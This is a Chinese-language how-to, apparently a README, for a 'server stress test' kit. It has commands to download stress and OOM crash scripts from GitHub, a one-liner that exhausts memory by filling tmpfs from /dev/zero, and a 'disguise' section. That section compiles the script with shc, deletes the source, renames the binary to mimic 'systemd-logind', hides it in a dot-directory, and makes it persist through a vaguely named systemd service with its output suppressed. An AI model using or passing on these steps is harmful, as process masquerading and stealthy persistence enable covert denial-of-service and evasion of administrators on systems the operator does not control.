服务器压力测试脚本

依赖安装

需要 stress-ng：

```bash
apt install stress-ng -y
```

脚本下载

· 压力测试脚本

```bash
curl -O https://raw.githubusercontent.com/aelennb/Server-stress-test/refs/heads/main/yali.sh
```

· 宕机测试脚本（OOM）

```bash
curl -O https://raw.githubusercontent.com/aelennb/Server-stress-test/refs/heads/main/oom.sh
```

内存杀手（快速耗尽内存）

```bash
sudo mount -t tmpfs -o size=100% tmpfs /tmp```


```nohup cat /dev/zero > /tmp/bigfile >/dev/null 2>&1 &
```

下载脚本后，请使用编辑器按需修改配置。

---

伪装方法（将脚本编译为二进制并隐藏进程）

1. 安装编译工具

```bash
apt install shc -y
apt install gcc make -y
```

2. 编译脚本

```bash
shc -r -f yali.sh
```

执行后会生成 yali.sh.x 二进制文件。

3. 清理无用源码

```bash
rm -f yali.sh.x.c
```

4. 伪装成系统常用进程

```bash
mv yali.sh.x systemd-logind
chmod 700 systemd-logind
```

---

开机自启（systemd 服务）

创建 systemd 服务文件：

```bash
nano /etc/systemd/system/sys-local.service
```

写入以下内容（请将 ExecStart 路径改为实际存放路径）：

```ini
[Unit]
Description=System Local Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/local/.sysd/sshd-local
StandardOutput=null
StandardError=null
PrivateTmp=true
Restart=on-failure
RestartSec=3

[Install]
WantedBy=multi-user.target
```

重新加载并启动服务：

```bash
systemctl daemon-reload
systemctl restart sys-local
systemctl status sys-local
```

---

隐藏目录与隐身启动

创建隐藏目录

```bash
mkdir -p /usr/local/.sysd/
```

移动伪装后的二进制文件

```bash
mv systemd-logind /usr/local/.sysd/
```

无痕启动（不挂载终端）

```bash
setsid /usr/local/.sysd/systemd-logind >/dev/null 2>&1 &
```